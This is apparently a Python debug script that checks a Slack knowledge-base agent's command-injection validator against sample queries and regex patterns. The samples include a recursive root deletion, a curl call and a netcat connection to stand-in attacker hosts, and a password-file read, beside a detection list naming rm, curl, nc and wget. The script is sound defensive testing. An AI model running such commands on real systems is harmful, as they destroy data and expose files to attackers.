#!/usr/bin/env python3
"""Debug command injection pattern matching."""

import sys
import os
import re

# Add src to path for imports
sys.path.insert(0, os.path.join(os.path.dirname(__file__), 'src'))

from slack_kb_agent.validation import InputValidator, get_validator

def test_patterns():
    """Test command injection patterns directly."""
    
    # Test queries from the failing test
    dangerous_queries = [
        "test; rm -rf /",
        "test && curl evil.com", 
        "test | nc attacker.com 4444",
        "$(whoami)",
        "`cat /etc/passwd`"
    ]
    
    # Get the patterns
    patterns = [
        r"(&&|\|\|)",        # Command chaining
        r";\s*(rm|curl|nc|wget)", # Dangerous commands after semicolon
        r"\$\([^)]*\)",      # Command substitution
        r"`[^`]*`",          # Backtick command execution
        r"\\x[0-9a-fA-F]{2}", # Hex-encoded characters
    ]
    
    compiled_patterns = [re.compile(pattern, re.IGNORECASE) for pattern in patterns]
    
    print("Testing command injection patterns:")
    print("=" * 50)
    
    for query in dangerous_queries:
        print(f"\nTesting query: '{query}'")
        
        # Test each pattern individually
        for i, pattern in enumerate(compiled_patterns):
            match = pattern.search(query)
            if match:
                print(f"  ✓ Pattern {i} matched: {patterns[i]} (match: '{match.group()}')")
            else:
                print(f"  ✗ Pattern {i} no match: {patterns[i]}")
        
        # Test with validator
        validator = get_validator()
        result = validator.validate_query(query)
        print(f"  Validator result: is_valid={result.is_valid}")
        print(f"  Error message: {result.error_message}")

if __name__ == "__main__":
    test_patterns()